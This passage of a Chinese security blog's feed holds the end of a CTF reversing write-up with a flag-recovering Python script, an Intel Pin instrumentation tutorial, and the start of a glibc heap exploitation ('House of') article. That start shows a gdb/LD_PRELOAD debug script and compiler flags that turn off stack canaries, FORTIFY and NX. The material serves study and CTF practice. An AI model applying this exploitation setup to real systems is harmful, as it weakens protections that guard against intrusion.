43, 96, 31, 89, 92, 45, 126, 103, 76, 45, 99, 93, 100, 110, 109, 67, 103, 58, 116, 118, 54, 115, 44, 62, 68, 62, 59, 78, 59, 94, 79, 95, 101, 112, 107, 84, 34, 35, 88, 93, 74, 49, 94&#125;,</span><br><span class="line">&#123;92, 64, 46, 124, 53, 44, 43, 51, 51, 44, 77, 64, 91, 109, 51, 63, 59, 38, 95, 61, 96, 58, 59, 116, 106, 120, 123, 95, 76, 117, 41, 50, 31, 31, 94, 126, 108, 101, 97, 101, 63, 123, 95, 36, 91, 66, 115, 62, 81, 105, 123, 85, 93, 54, 115, 124, 59, 41, 33, 62, 105, 47, 98, 33, 112, 93, 84, 29, 85, 118, 99, 32, 56, 83, 100, 75, 113, 79, 36, 120, 49, 84, 106, 69, 39, 28, 58, 95, 44, 86, 90, 103, 34, 104&#125;,</span><br><span class="line">&#123;100, 108, 41, 40, 44, 47, 38, 36, 28, 110, 35, 112, 118, 97, 111, 90, 89, 104, 64, 34, 74, 28, 86, 122, 66, 96, 66, 48, 126, 36, 114, 29, 124, 43, 119, 63, 101, 98, 117, 93, 60, 99, 100, 102, 79, 118, 38, 39, 53, 99, 32, 53, 53, 75, 88, 77, 117, 92, 28, 114, 69, 74, 101, 62, 49, 100, 51, 53, 83, 97, 79, 32, 75, 68, 58, 45, 110, 54, 48, 66, 107, 112, 53, 35, 71, 29, 98, 34, 90, 49, 32, 79, 46, 35, 47&#125;,</span><br><span class="line">&#123;44, 52, 48, 38, 99, 120, 60, 76, 91, 50, 80, 109, 30, 40, 118, 92, 112, 29, 67, 32, 69, 58, 104, 69, 32, 63, 33, 81, 31, 85, 34, 103, 114, 110, 52, 84, 93, 39, 101, 60, 112, 64, 101, 59, 47, 96, 30, 124, 118, 95, 101, 71, 46, 41, 116, 55, 111, 112, 107, 80, 61, 114, 85, 125, 115, 105, 75, 92, 125, 67, 38, 84, 37, 94, 97, 108, 87, 106, 101, 99, 124, 86, 106, 74, 57, 47, 81, 107, 116, 118, 41, 32, 60, 63, 106, 66&#125;,</span><br><span class="line">&#123;87, 112, 86, 66, 87, 34, 84, 103, 104, 119, 33, 62, 42, 99, 50, 68, 72, 79, 122, 45, 91, 106, 113, 80, 83, 58, 96, 38, 118, 58, 111, 77, 71, 109, 49, 108, 68, 67, 57, 69, 57, 118, 75, 121, 101, 103, 91, 85, 101, 52, 123, 115, 41, 46, 30, 126, 55, 110, 42, 102, 126, 28, 116, 112, 106, 77, 30, 122, 59, 94, 71, 35, 34, 68, 89, 91, 56, 47, 41, 103, 53, 82, 75, 98, 96, 93, 46, 99, 71, 52, 41, 28, 75, 101, 39, 125, 34&#125;,</span><br><span class="line">&#123;91, 93, 111, 51, 45, 43, 54, 75, 47, 41, 74, 96, 57, 113, 75, 67, 50, 43, 88, 48, 78, 77, 53, 74, 61, 60, 118, 55, 105, 91, 70, 95, 31, 106, 78, 35, 46, 87, 79, 122, 33, 95, 73, 113, 62, 124, 54, 84, 31, 92, 57, 34, 126, 39, 39, 102, 118, 66, 77, 58, 69, 91, 97, 31, 73, 34, 125, 100, 125, 120, 64, 116, 104, 118, 91, 98, 91, 92, 93, 48, 105, 88, 108, 101, 69, 47, 110, 97, 100, 122, 105, 72, 119, 54, 61, 80, 98, 42&#125;,</span><br><span class="line">&#123;57, 38, 112, 58, 61, 98, 40, 75, 32, 41, 71, 30, 46, 94, 50, 100, 46, 84, 33, 117, 121, 99, 84, 96, 108, 89, 86, 95, 115, 84, 82, 96, 76, 40, 34, 114, 124, 107, 116, 32, 98, 32, 32, 53, 65, 67, 43, 89, 72, 126, 45, 65, 126, 51, 48, 53, 89, 101, 96, 31, 112, 84, 104, 62, 85, 94, 118, 106, 106, 84, 113, 55, 93, 61, 99, 78, 103, 105, 63, 122, 90, 117, 35, 105, 74, 90, 72, 58, 49, 97, 79, 75, 106, 121, 42, 104, 88, 94, 95&#125;,</span><br><span class="line">&#123;50, 60, 71, 108, 107, 119, 120, 102, 121, 115, 50, 88, 66, 103, 49, 30, 55, 121, 59, 33, 76, 92, 68, 61, 45, 50, 35, 74, 89, 87, 30, 90, 60, 40, 107, 79, 58, 81, 100, 70, 97, 53, 43, 96, 84, 114, 110, 58, 30, 120, 97, 108, 74, 126, 104, 71, 56, 95, 66, 78, 83, 86, 90, 34, 52, 97, 34, 104, 70, 80, 91, 30, 121, 69, 122, 66, 45, 28, 93, 48, 43, 124, 47, 77, 117, 43, 97, 37, 122, 96, 56, 33, 52, 88, 68, 53, 42, 86, 90, 62&#125;</span><br></pre></td></tr></table></figure></div><p>求这个三角形从上到下最大和的路径，路径的字符里就有flag</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">data = [] <span class="comment">#这里就填入上面数据，不重复写了</span></span><br><span class="line"></span><br><span class="line">A = deepcopy(data)</span><br><span class="line">B = [<span class="string">''</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(A))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(A)<span class="number">-1</span>)[::<span class="number">-1</span>]:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">assert</span> A[i+<span class="number">1</span>][j]!=A[i+<span class="number">1</span>][j+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> A[i+<span class="number">1</span>][j]&gt;A[i+<span class="number">1</span>][j+<span class="number">1</span>]:</span><br><span class="line">            A[i][j]+=A[i+<span class="number">1</span>][j]</span><br><span class="line">            B[i] += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            A[i][j]+=A[i+<span class="number">1</span>][j+<span class="number">1</span>]</span><br><span class="line">            B[i] += <span class="string">'1'</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line">C = [data[<span class="number">0</span>][<span class="number">0</span>]]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">99</span>):</span><br><span class="line">    <span class="keyword">if</span> B[x][y]==<span class="string">'1'</span>:</span><br><span class="line">        y+=<span class="number">1</span></span><br><span class="line">    C.append(data[x+<span class="number">1</span>][y])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(C)):</span><br><span class="line">    print(chr(C[i]),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;De1CTF2019-Signal-vm-1-amp-2&quot;&gt;&lt;a href=&quot;#De1CTF2019-Signal-vm-1-amp-2&quot; class=&quot;headerlink&quot; title=&quot;De1CTF2019 Signal vm</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Intel Pin的基本使用</title>
    <link href="https://kabeor.github.io/Intel%20Pin%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://kabeor.github.io/Intel%20Pin%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2020-03-25T16:00:00.000Z</published>
    <updated>2020-03-26T11:54:23.374Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intel-Pin的基本使用"><a href="#Intel-Pin的基本使用" class="headerlink" title="Intel Pin的基本使用"></a>Intel Pin的基本使用</h1><p>Pin是Intel开发的一款动态二进制插桩工具，可用于污点分析，Fuzz，漏洞挖掘等。</p><p>Pin工具下载地址：pintool.org</p><h2 id="插桩粒度"><a href="#插桩粒度" class="headerlink" title="插桩粒度"></a>插桩粒度</h2><ol><li>指令级插桩（instruction instrumentatio），通过函数INS_AddInstrumentFunctio实现。</li><li>轨迹级插装（trace instrumentation），通过函数TRACE_AddInstrumentFunction实现。</li><li>镜像级插装（image instrumentation），使用IMG_AddInstrumentFunction函数，由于其依赖于符号信息去确定函数边界，因此必须在调用PIN_Init之前调用PIN_InitSymbols。</li><li>函数级的插装（routine instrumentation），使用RTN_AddInstrumentFunction函数。函数级插装比镜像级插装更有效，因为只有镜像中的一小部分函数被执行。</li></ol><h2 id="Pin工具测试"><a href="#Pin工具测试" class="headerlink" title="Pin工具测试"></a>Pin工具测试</h2><p>首先编译一个名为 insmix 的工具，这个工具是用来统计应用程序执行的 x86 指令的数量的。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pin-gcc-linux/<span class="built_in">source</span>/tools/Insmix/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></div><p>执行成功后可在Insmix/obj-intel64下生成insmix.so和insmin.o</p><p>返回到 pin 的根目录，然后输入如下指令将 insmix 工具附加在 ls 指令上并由 pin 运行 ls 指令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./pin -t <span class="built_in">source</span>/tools/Insmix/obj-intel64/insmix.so -- ls</span><br></pre></td></tr></table></figure></div><p>在pin根目录下将生成insmix.out</p><p><a href="https://i.loli.net/2020/03/26/GiY8eo3nQ6tpPaL.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/03/26/GiY8eo3nQ6tpPaL.png" class="lazyload"></a></p><p>可以看到pin可以输出非常详细的信息，甚至包含每个汇编指令的数量。</p><h2 id="插桩分析基本框架"><a href="#插桩分析基本框架" class="headerlink" title="插桩分析基本框架"></a>插桩分析基本框架</h2><p>查看/pin-gcc-linux/source/tools/ManualExamples下的inscount0.cpp。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright 2002-2019 Intel Corporation.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * This software is provided to you as Sample Source Code as defined in the accompanying</span></span><br><span class="line"><span class="comment"> * End User License Agreement for the Intel(R) Software Development Products ("Agreement")</span></span><br><span class="line"><span class="comment"> * section 1.L.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * This software and the related documents are provided as is, with no express or implied</span></span><br><span class="line"><span class="comment"> * warranties, other than those that are expressly stated in the License.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pin.H"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cerr</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::ofstream;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::ios;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">ofstream OutFile;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The running count of instructions is kept here</span></span><br><span class="line"><span class="comment">// make it static to help the compiler optimize docount</span></span><br><span class="line"><span class="keyword">static</span> UINT64 icount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This function is called before every instruction is executed</span></span><br><span class="line"><span class="function">VOID <span class="title">docount</span><span class="params">()</span> </span>&#123; icount++; &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// Pin calls this function every time a new instruction is encountered</span></span><br><span class="line"><span class="function">VOID <span class="title">Instruction</span><span class="params">(INS ins, VOID *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Insert a call to docount before every instruction, no arguments are passed</span></span><br><span class="line">    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">KNOB&lt;<span class="built_in">string</span>&gt; <span class="title">KnobOutputFile</span><span class="params">(KNOB_MODE_WRITEONCE, <span class="string">"pintool"</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"o"</span>, <span class="string">"inscount.out"</span>, <span class="string">"specify output file name"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This function is called when the application exits</span></span><br><span class="line"><span class="function">VOID <span class="title">Fini</span><span class="params">(INT32 code, VOID *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Write to a file since cout and cerr maybe closed by the application</span></span><br><span class="line">    OutFile.setf(ios::showbase);</span><br><span class="line">    OutFile &lt;&lt; <span class="string">"Count "</span> &lt;&lt; icount &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    OutFile.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===================================================================== */</span></span><br><span class="line"><span class="comment">/* Print Help Message                                                    */</span></span><br><span class="line"><span class="comment">/* ===================================================================== */</span></span><br><span class="line"></span><br><span class="line"><span class="function">INT32 <span class="title">Usage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cerr</span> &lt;&lt; <span class="string">"This tool counts the number of dynamic instructions executed"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cerr</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===================================================================== */</span></span><br><span class="line"><span class="comment">/* Main                                                                  */</span></span><br><span class="line"><span class="comment">/* ===================================================================== */</span></span><br><span class="line"><span class="comment">/*   argc, argv are the entire command line: pin -t &lt;toolname&gt; -- ...    */</span></span><br><span class="line"><span class="comment">/* ===================================================================== */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Initialize pin</span></span><br><span class="line">    <span class="keyword">if</span> (PIN_Init(argc, argv)) <span class="keyword">return</span> Usage();</span><br><span class="line"></span><br><span class="line">    OutFile.open(KnobOutputFile.Value().c_str());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register Instruction to be called to instrument instructions</span></span><br><span class="line">    INS_AddInstrumentFunction(Instruction, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register Fini to be called when the application exits</span></span><br><span class="line">    PIN_AddFiniFunction(Fini, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Start the program, never returns</span></span><br><span class="line">    PIN_StartProgram();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>代码所展示的是pin的基本框架</p><ol><li>调用PIN_Init进行初始化。</li><li>进入INS_AddInstrumentFunction注册插桩函数，INS_AddInstrumentFunction应该是一个回调函数，会在每次指令执行前调用。</li><li>PIN_AddFiniFunction注册一个将在目标程序结束时被执行的函数。</li><li>PIN_StartProgram开始启动。</li></ol><p>所示的代码调用docount来记录目标程序执行的指令数量。（记录程序执行了的指令数量可以用于看不同输入的熵，从而判断某一输入是否执行了与其他输入不同的流程）</p><h2 id="精确的指令插桩"><a href="#精确的指令插桩" class="headerlink" title="精确的指令插桩"></a>精确的指令插桩</h2><p>查看/pin-gcc-linux/source/tools/ManualExamples下的safecopy.cpp。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright 2002-2019 Intel Corporation.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * This software is provided to you as Sample Source Code as defined in the accompanying</span></span><br><span class="line"><span class="comment"> * End User License Agreement for the Intel(R) Software Development Products ("Agreement")</span></span><br><span class="line"><span class="comment"> * section 1.L.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * This software and the related documents are provided as is, with no express or implied</span></span><br><span class="line"><span class="comment"> * warranties, other than those that are expressly stated in the License.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pin.H"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cerr</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::ofstream* out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//=======================================================</span></span><br><span class="line"><span class="comment">//  Analysis routines</span></span><br><span class="line"><span class="comment">//=======================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Move from memory to register</span></span><br><span class="line"><span class="function">ADDRINT <span class="title">DoLoad</span><span class="params">(REG reg, ADDRINT * addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *out &lt;&lt; <span class="string">"Emulate loading from addr "</span> &lt;&lt; addr &lt;&lt; <span class="string">" to "</span> &lt;&lt; REG_StringShort(reg) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ADDRINT value;</span><br><span class="line">    PIN_SafeCopy(&amp;value, addr, <span class="keyword">sizeof</span>(ADDRINT));</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//=======================================================</span></span><br><span class="line"><span class="comment">// Instrumentation routines</span></span><br><span class="line"><span class="comment">//=======================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">EmulateLoad</span><span class="params">(INS ins, VOID* v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Find the instructions that move a value from memory to a register</span></span><br><span class="line">    <span class="keyword">if</span> (INS_Opcode(ins) == XED_ICLASS_MOV &amp;&amp;</span><br><span class="line">        INS_IsMemoryRead(ins) &amp;&amp;</span><br><span class="line">        INS_OperandIsReg(ins, <span class="number">0</span>) &amp;&amp;</span><br><span class="line">        INS_OperandIsMemory(ins, <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// op0 &lt;- *op1</span></span><br><span class="line">        INS_InsertCall(ins,</span><br><span class="line">                       IPOINT_BEFORE,</span><br><span class="line">                       AFUNPTR(DoLoad),</span><br><span class="line">                       IARG_UINT32,</span><br><span class="line">                       REG(INS_OperandReg(ins, <span class="number">0</span>)),</span><br><span class="line">                       IARG_MEMORYREAD_EA,</span><br><span class="line">                       IARG_RETURN_REGS,</span><br><span class="line">                       INS_OperandReg(ins, <span class="number">0</span>),</span><br><span class="line">                       IARG_END);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete the instruction</span></span><br><span class="line">        INS_Delete(ins);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===================================================================== */</span></span><br><span class="line"><span class="comment">/* Print Help Message                                                    */</span></span><br><span class="line"><span class="comment">/* ===================================================================== */</span></span><br><span class="line"></span><br><span class="line"><span class="function">INT32 <span class="title">Usage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cerr</span> &lt;&lt; <span class="string">"This tool demonstrates the use of SafeCopy"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cerr</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===================================================================== */</span></span><br><span class="line"><span class="comment">/* Main                                                                  */</span></span><br><span class="line"><span class="comment">/* ===================================================================== */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Write to a file since cout and cerr maybe closed by the application</span></span><br><span class="line">    out = <span class="keyword">new</span> <span class="built_in">std</span>::ofstream(<span class="string">"safecopy.out"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize pin &amp; symbol manager</span></span><br><span class="line">    <span class="keyword">if</span> (PIN_Init(argc, argv)) <span class="keyword">return</span> Usage();</span><br><span class="line">    PIN_InitSymbols();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register EmulateLoad to be called to instrument instructions</span></span><br><span class="line">    INS_AddInstrumentFunction(EmulateLoad, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Never returns</span></span><br><span class="line">    PIN_StartProgram();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>如下代码所示，可以控制在想要的位置寄存器进行插桩</p><p>还可以获取寄存器值，对内存进行读写等。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">EmulateLoad</span><span class="params">(INS ins, VOID* v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Find the instructions that move a value from memory to a register</span></span><br><span class="line">    <span class="keyword">if</span> (INS_Opcode(ins) == XED_ICLASS_MOV &amp;&amp;</span><br><span class="line">        INS_IsMemoryRead(ins) &amp;&amp;</span><br><span class="line">        INS_OperandIsReg(ins, <span class="number">0</span>) &amp;&amp;</span><br><span class="line">        INS_OperandIsMemory(ins, <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// op0 &lt;- *op1</span></span><br><span class="line">        INS_InsertCall(ins,</span><br><span class="line">                       IPOINT_BEFORE,</span><br><span class="line">                       AFUNPTR(DoLoad),</span><br><span class="line">                       IARG_UINT32,</span><br><span class="line">                       REG(INS_OperandReg(ins, <span class="number">0</span>)),</span><br><span class="line">                       IARG_MEMORYREAD_EA,</span><br><span class="line">                       IARG_RETURN_REGS,</span><br><span class="line">                       INS_OperandReg(ins, <span class="number">0</span>),</span><br><span class="line">                       IARG_END);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete the instruction</span></span><br><span class="line">        INS_Delete(ins);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>pin的基本操作就写到这里，使用pin对ctf题目进行分析也很有趣，之后会进行尝试。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Intel-Pin的基本使用&quot;&gt;&lt;a href=&quot;#Intel-Pin的基本使用&quot; class=&quot;headerlink&quot; title=&quot;Intel Pin的基本使用&quot;&gt;&lt;/a&gt;Intel</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>House of 系列堆漏洞详解(一)</title>
    <link href="https://kabeor.github.io/House%20of%20%E7%B3%BB%E5%88%97%E5%A0%86%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3(%E4%B8%80)/"/>
    <id>https://kabeor.github.io/House%20of%20%E7%B3%BB%E5%88%97%E5%A0%86%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3(%E4%B8%80)/</id>
    <published>2020-03-04T16:00:00.000Z</published>
    <updated>2020-03-16T04:44:07.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-系列堆漏洞详解-一"><a href="#House-of-系列堆漏洞详解-一" class="headerlink" title="House of 系列堆漏洞详解(一)"></a>House of 系列堆漏洞详解(一)</h1><p>首发于<a href="https://xz.aliyun.com/t/7266" target="_blank" rel="noopener">先知社区</a></p><h2 id="多Glibc版本调试方法"><a href="#多Glibc版本调试方法" class="headerlink" title="多Glibc版本调试方法"></a>多Glibc版本调试方法</h2><p>由于house of 技术中的一些漏洞只能在特定的低版本Glibc中触发，因此我这里基于pwntools写了一个脚本，可以使文中所示的程序在高版本系统下编译后，gdb调试时能强制加载特定版本的Glibc。</p><p>首先需要准备特定版本的Glibc，这里以libc-2.25.so.6为例</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">pro = raw_input(<span class="string">"py &lt;Bin_Path&gt;:   "</span>)</span><br><span class="line">pro=pro.replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">io = process([pro],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.25.so.6"</span>&#125;)</span><br><span class="line">gdb.attach(io,<span class="string">'set exec-wrapper env "LD_PRELOAD=./libc-2.25.so.6"'</span>)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><p>在弹出的gdb窗口 r 一下就可以运行了。</p><p>这里再提一下gcc编译，如果想要进行源码调试，需要加 -g 选项。-D GLIBC_VERSION=25 选项可设置动态链接的glibc版本为2.25。</p><p>为了方便我们之后的调试，需要在编译时关闭相关保护，选项如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CANNARY</span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FORTIFY</span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 </span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查(如果检查到缓冲区溢出，就终止程序)</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">NX</span><br><span class="line">gcc -o <span class="built_in">test</span> test.c// 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c// 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c// 开启NX保护</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" 